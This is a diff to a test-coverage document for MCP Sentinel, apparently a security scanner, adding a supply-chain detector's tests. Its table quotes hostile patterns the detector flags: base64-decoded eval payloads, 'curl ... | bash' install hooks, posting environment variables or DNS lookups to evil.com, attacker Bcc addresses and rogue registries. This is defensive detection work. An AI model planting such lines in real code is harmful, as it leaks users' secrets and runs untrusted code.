@@ -1,6 +1,6 @@
-# MCP Sentinel v0.2.0 — Test Coverage
+# MCP Sentinel v0.3.0 — Test Coverage
 
-**Total: 334 passed, 4 xfailed (documented), 0 failed**
+**Total: 383 passed, 4 xfailed (documented), 0 failed**
 **Python:** 3.9, 3.10, 3.11, 3.12
 **Last run:** 2026-03-23
 
@@ -10,6 +10,7 @@
 
 | Test File | Tests | Status | What It Covers |
 |---|---|---|---|
+| `tests/unit/test_supply_chain.py` | 49 | 49 pass | SupplyChainDetector — new in v0.3.0 |
 | `tests/unit/test_ssrf_detector.py` | 25 | 25 pass | SSRFDetector — new in v0.2.0 |
 | `tests/unit/test_network_binding.py` | 22 | 22 pass | NetworkBindingDetector — new in v0.2.0 |
 | `tests/unit/test_missing_auth.py` | 19 | 19 pass | MissingAuthDetector — new in v0.2.0 |
@@ -28,6 +29,64 @@
 | `tests/unit/core/test_config.py` | 5 | 5 pass | Configuration/settings |
 | `tests/integration/test_scanner.py` | 7 | 7 pass | End-to-end scan pipeline |
 | `tests/test_caching.py` | 1 | 1 pass | MD5-based file cache |
+
+---
+
+## v0.3.0 New Detector Tests
+
+### SupplyChainDetector (49 tests)
+
+| Test | What It Verifies |
+|---|---|
+| `test_detector_name` | `detector.name == "SupplyChainDetector"` |
+| `test_detector_enabled_by_default` | `detector.enabled is True` |
+| `test_applicable_to_python` | `.py` in scope |
+| `test_applicable_to_javascript` | `.js` in scope |
+| `test_applicable_to_typescript` | `.ts` in scope |
+| `test_applicable_to_shell` | `.sh` in scope |
+| `test_applicable_to_setup_py` | `setup.py` always in scope |
+| `test_applicable_to_package_json` | `package.json` always in scope |
+| `test_applicable_to_requirements_txt` | `requirements.txt` always in scope |
+| `test_applicable_to_pyproject_toml` | `pyproject.toml` always in scope |
+| `test_applicable_to_npmrc` | `.npmrc` always in scope |
+| `test_not_applicable_to_markdown` | `.md` excluded |
+| `test_not_applicable_to_image` | `.png` excluded |
+| `test_detect_eval_base64_python` | `eval(base64.b64decode(...))` → CRITICAL |
+| `test_detect_exec_base64_python` | `exec(base64.b64decode(...))` → CRITICAL |
+| `test_detect_eval_atob_javascript` | `eval(atob(...))` → CRITICAL |
+| `test_detect_eval_buffer_base64` | `eval(Buffer.from(data,'base64').toString(...))` → CRITICAL |
+| `test_detect_zlib_decompress_base64` | `exec(zlib.decompress(base64.b64decode(...)))` → CRITICAL |
+| `test_encoded_payload_line_number_accuracy` | Line number points to the `eval(...)` line |
+| `test_encoded_payload_code_snippet_captured` | Code snippet contains `base64` |
+| `test_detect_setup_py_cmdclass` | `cmdclass={'install': CustomInstall}` with shell call in setup.py → HIGH |
+| `test_detect_npm_postinstall_hook` | `"postinstall": "curl ... \| bash"` in package.json → HIGH |
+| `test_detect_subprocess_curl_in_setup` | `subprocess.call(['curl', ...])` in setup.py → HIGH |
+| `test_no_false_positive_npm_build_hook` | `"postinstall": "node ./scripts/build.js"` not flagged |
+| `test_detect_requests_in_setup_py` | `requests.post(...)` inside setup.py → CRITICAL |
+| `test_detect_urllib_in_setup_py` | `urllib.request.urlopen(...)` inside setup.py → CRITICAL |
+| `test_no_network_call_outside_setup_py` | `requests.get(...)` in server.py not flagged as install-time |
+| `test_detect_requests_post_with_os_environ` | `requests.post(..., data=os.environ)` → CRITICAL |
+| `test_detect_fetch_with_process_env` | `fetch('...', {body: JSON.stringify(process.env)})` → CRITICAL |
+| `test_detect_dns_exfiltration` | `socket.gethostbyname(b64encode(os.environ[...]) + '.evil.com')` → CRITICAL |
+| `test_exfiltration_remediation_contains_rotate` | Remediation text advises rotating credentials |
+| `test_detect_bcc_hardcoded_python` | `msg["Bcc"] = "attacker@evil.com"` → HIGH |
+| `test_detect_bcc_in_dict_assignment` | `{'bcc': 'spy@attacker.com', ...}` → HIGH |
+| `test_detect_forward_to_hardcoded` | `forward_to = 'data-collector@evil.com'` → HIGH |
+| `test_no_false_positive_bcc_comment` | `# BCC: ...` comment not flagged |
+| `test_detect_extra_index_url_unknown` | `--extra-index-url https://packages.internal-corp.example/` → MEDIUM |
+| `test_detect_npm_registry_override` | `registry=https://npm.internal.attacker.com/` in .npmrc → MEDIUM |
+| `test_no_false_positive_official_pypi` | `--index-url https://pypi.org/simple/` not flagged |
+| `test_no_false_positive_official_npm_registry` | `registry=https://registry.npmjs.org/` not flagged |
+| `test_detect_colourama_typosquat` | `import colourama` → HIGH |
+| `test_detect_crossenv_typosquat` | `require("crossenv")` → HIGH |
+| `test_typosquat_references_not_empty` | Typosquat findings include reference URLs |
+| `test_no_false_positive_test_file` | Lines containing `test` are suppressed |
+| `test_no_false_positive_example_comment` | Comment lines not flagged |
+| `test_vulnerability_has_cwe` | All findings have a `cwe_id` |
+| `test_vulnerability_has_mitre_attack` | All findings have `mitre_attack_ids` |
+| `test_vulnerability_has_remediation` | All findings have non-empty `remediation` |
+| `test_vulnerability_detector_field` | `v.detector == "SupplyChainDetector"` |
+| `test_vulnerability_engine_field` | `v.engine == "static"` |
 
 ---
 
@@ -234,7 +293,10 @@ python -m pytest tests/ -v
 # Specific detector
 python -m pytest tests/unit/test_ssrf_detector.py -v
 
-# v0.2.0 new detectors only
+# v0.3.0 new detector only
+python -m pytest tests/unit/test_supply_chain.py -v
+
+# v0.2.0 new detectors
 python -m pytest tests/unit/test_ssrf_detector.py \
                  tests/unit/test_network_binding.py \
                  tests/unit/test_missing_auth.py \
